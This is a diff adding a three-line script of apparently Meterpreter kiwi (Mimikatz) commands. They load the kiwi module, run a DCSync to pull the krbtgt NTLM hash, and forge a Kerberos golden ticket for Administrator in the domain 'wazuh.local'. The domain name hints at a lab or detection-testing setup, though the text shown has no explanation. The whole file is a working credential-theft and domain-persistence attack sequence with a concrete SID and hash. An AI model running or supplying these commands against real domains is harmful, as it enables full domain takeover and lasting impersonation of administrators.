@@ -1,0 +1,3 @@
+load kiwi
+dcsync_ntlm krbtgt
+golden_ticket_create -d wazuh.local -u Administrator -s S-1-5-21-3307301586-4221688441-1196996515-502 -k ec9183c701e861eda574d85939d635cd -t /tmp/golden.tck
